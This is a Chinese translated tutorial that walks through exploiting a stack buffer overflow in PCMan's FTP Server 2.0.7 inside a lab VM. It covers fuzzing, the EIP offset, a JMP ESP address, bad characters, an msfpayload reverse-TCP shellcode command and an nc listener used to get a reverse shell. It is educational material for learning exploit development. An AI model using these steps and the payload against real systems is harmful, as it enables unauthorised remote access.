# 【技术分享】简单的缓冲区溢出分析

#### 译文声明
本文为翻译文章，原文来源于netsec。具体表达和含义以原文为准。

**翻译者**: [阻圣](http://bobao.360.cn/member/contribute?uid=134615136)  
**稿费**: 200RMB  
**投稿方式**: 发送邮件至linwei#360.cn 或访问[网页版](http://bobao.360.cn/contribute/index)在线投稿

### 前言
本文将详细介绍如何找到一个简单的缓冲区溢出漏洞，并最终通过该漏洞攻击服务以获得反弹shell。虽然有许多公开的漏洞可以作为示例，但本文选择使用exploit-db上发现的PCMan’s FTP Server 2.0.7中的三个缓冲区溢出漏洞作为案例。

### 准备工作
在开始之前，我们需要准备以下环境和工具：
- Windows XP SP3 虚拟机（目标系统）
- Kali Linux 虚拟机（攻击者系统）
- OllyDbg 安装在Windows XP上
- PCMan’s FTP Server 2.0.7

此外，您还需要具备以下基础知识：
- x86汇编语言的基础知识
- Python编程语言的基础知识

### 缓冲区溢出的基础知识
本文不会深入介绍缓冲区溢出的详细原理，仅提供一些基本概念。当开发者不检查用户输入的数据边界时，就会发生缓冲区溢出。简单来说，如果用户输入的数据长度超过了开发人员定义的缓冲区大小，多余的数据会覆盖关键寄存器（如EIP）。EIP是指令指针寄存器，存储了下一条指令的地址。如果EIP被用户输入的数据覆盖，程序通常会崩溃，因为它尝试执行无效的内存地址。我们的目标是构造特定的数据发送到程序中，覆盖EIP，使其指向我们控制的位置，从而执行shellcode。

### 查找缓冲区溢出
了解了基础知识后，我们需要找到缓冲区溢出的位置。为此，我们将使用模糊测试。通过向程序发送不同长度和内容的自定义字符串，观察程序是否崩溃。如果程序崩溃，我们可以进一步调查崩溃原因并确定是否可利用。

以PCMan’s FTP Server 2.0.7为例，我们首先测试用户名输入点是否存在缓冲区溢出问题。使用Python编写一个Fuzzer程序进行测试。运行Fuzzer程序后，发现发送大约2000字节的数据时程序崩溃。接下来，我们将使用OllyDbg来监视程序崩溃时的寄存器状态。

### 崩溃调查
1. 打开OllyDbg并附加FTP Server。
2. 按F9运行程序，再次运行Fuzzer程序并等待程序崩溃。
3. 程序崩溃后，不要关闭程序，查看OllyDbg中的寄存器窗口，可以看到EIP寄存器的值为41414141（即AAAA）。
4. 这意味着EIP被覆盖为无效地址，导致程序崩溃。这是一个好消息，因为这意味着我们可以控制EIP。

### 控制EIP
1. 使用Metasploit的`pattern_create`工具生成一个2100字节的字符串。
   ```ruby
   ruby /usr/share/metasploit-framework/tools/pattern_create.rb 2100
   ```
2. 将生成的字符串作为payload发送到服务器。
3. 再次运行Fuzzer程序，观察EIP寄存器的值变为0x43386F43。
4. 使用`pattern_offset`工具确定字节数。
   ```ruby
   ruby /usr/share/metasploit-framework/tools/pattern_offset.rb 43386F43
   [*] Exact match at offset 2004
   ```
5. 我们现在知道EIP被覆盖前有2004个字节。
6. 为了确认准确性，再次重复上述步骤，发现EIP寄存器的值为0x42424242，成功被四个B覆盖。

### 寻找Shellcode的位置
1. 查看ESP寄存器指向的内存地址，例如0x0012EDB8。
2. 可以看到ESP指向了一堆0x43（C的ASCII值），我们需要将这些C替换为我们希望执行的Shellcode。
3. 让EIP跳转到ESP寄存器的位置。

### 获得EIP to Jump
1. 由于内存地址在不同计算机上不同，我们不能直接告诉EIP去某个特定地址。
2. 需要在程序的dll中找到具有JMP ESP命令的内存地址。
3. 使用OllyDbg查看加载的dll列表，选择SHELL32.dll进行搜索。
4. 找到的第一个结果位于内存地址0x7C9D30D7，且没有坏字符，可以利用。
5. 重启OllyDbg和服务，设置断点，运行Fuzzer程序，确认调试器暂停在断点处。

### 识别坏字符
1. 生成shellcode时需要避免坏字符，例如空字节0x00表示字符串结束。
2. 通过发送字符串数据来找到坏字符。
3. 观察堆栈，删除影响漏洞的字符，重新运行程序。
4. 最终找到三个坏字符：0x0D、0x0A和0x00。

### 定制Shellcode
1. 使用Metasploit的`msfpayload`或`msfvenom`生成shellcode。
   ```bash
   msfpayload windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -b 'x00x0ax0d' -e x86/shikata_ga_nai -t python
   ```
2. 生成的shellcode应避免包含坏字符。

### 攻击进行时-编写exploit
1. 将生成的shellcode与Fuzzer程序结合。
2. 使用nc监听443端口。
   ```bash
   nc -lvp 443
   ```
3. 运行exploit并等待连接。

### 总结
通过上述步骤，我们成功获得了反弹shell。请注意，本文仅供技术交流，请勿用于非法目的。建议使用虚拟机进行学习和实验。

希望本文对您有所帮助！